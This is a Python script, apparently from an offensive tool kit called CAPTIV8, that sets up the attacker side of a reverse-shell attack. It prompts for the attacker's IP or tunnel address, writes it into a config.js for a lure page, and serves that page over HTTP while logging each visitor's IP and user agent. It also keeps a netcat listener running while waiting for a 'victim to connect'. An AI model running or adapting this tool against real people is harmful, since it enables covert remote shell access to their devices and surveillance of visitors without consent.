#!/usr/bin/env python3

import os
import subprocess
import signal
import sys
import re
import socket
import time
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from threading import Thread

# Color codes
G = "\033[1;32m"
R = "\033[1;31m"
C = "\033[1;36m"
Y = "\033[1;33m"
RESET = "\033[0m"

# Banner
def banner():
    os.system("clear")
    print(f"""{G}
╔════════════════════════════════════╗
║     CAPTIV8 - REVERSE SHELL        ║
║        by xaiqttt | 2025           ║
╚════════════════════════════════════╝{RESET}
""")

banner()

# Validate IP or domain
def validate_ip(ip):
    if re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip):
        return all(0 <= int(part) <= 255 for part in ip.split('.'))
    elif re.match(r"^[a-zA-Z0-9.-]+$", ip):
        return True
    return False

# Validate port
def validate_port(port_str):
    return port_str.isdigit() and 1 <= int(port_str) <= 65535

# Check if port is in use
def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("127.0.0.1", port)) == 0

# Input prompts
while True:
    IP = input(f"{C}[?] Enter your IP or tunnel address (e.g. serveo.net):{RESET}\n> ").strip()
    if validate_ip(IP):
        break
    print(f"{R}[-] Invalid IP or domain.{RESET}")

while True:
    PORT = input(f"{C}[?] Enter port for reverse shell listener (1-65535):{RESET}\n> ").strip()
    if validate_port(PORT):
        break
    print(f"{R}[-] Invalid port.{RESET}")

while True:
    webport_input = input(f"{C}[?] Enter port for the HTTP server (1-65535):{RESET}\n> ").strip()
    if validate_port(webport_input):
        WEBPORT = int(webport_input)
        if not is_port_in_use(WEBPORT):
            break
        else:
            print(f"{R}[-] Port {WEBPORT} is already in use. Try another one.{RESET}")
    else:
        print(f"{R}[-] Invalid port.{RESET}")

# Write config.js
print(f"{Y}[+] Updating config.js...{RESET}")
with open("config.js", "w") as f:
    f.write(f"""const CONFIG = {{
    ip: "{IP}",
    port: {PORT}
}};""")

# Kill port just in case
os.system(f"fuser -k {WEBPORT}/tcp 2>/dev/null")

# HTTP server
class Handler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        ip = self.client_address[0]
        agent = self.headers.get('User-Agent')
        print(f"{G}[VISIT]{RESET} IP: {ip} | Agent: {agent}")
        print_listener_message()

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        super().end_headers()

# Start HTTP server
def start_server():
    try:
        with TCPServer(("", WEBPORT), Handler) as httpd:
            print(f"{G}[+] HTTP server running on port {WEBPORT}...{RESET}")
            print_listener_message()
            httpd.serve_forever()
    except OSError:
        print(f"{R}[-] Failed to bind HTTP server to port {WEBPORT}.{RESET}")
        sys.exit(1)

# Sticky Netcat listener print
def print_listener_message():
    print(f"\n{G}[+] Netcat listening on port {PORT}...{RESET}")
    print(f"{C}[!] Waiting for victim to connect...{RESET}\n")

# Ctrl+C
def cleanup(signum, frame):
    print(f"\n{R}[-] Stopping...{RESET}")
    os._exit(0)

signal.signal(signal.SIGINT, cleanup)

# Persistent nc listener
def nc_listener():
    while True:
        print_listener_message()
        subprocess.call(["nc", "-lvnp", PORT])
        banner()
        print(f"{Y}[+] Connection ended. Restarting listener...{RESET}")

# Threads
Thread(target=start_server, daemon=True).start()
Thread(target=nc_listener, daemon=False).start()
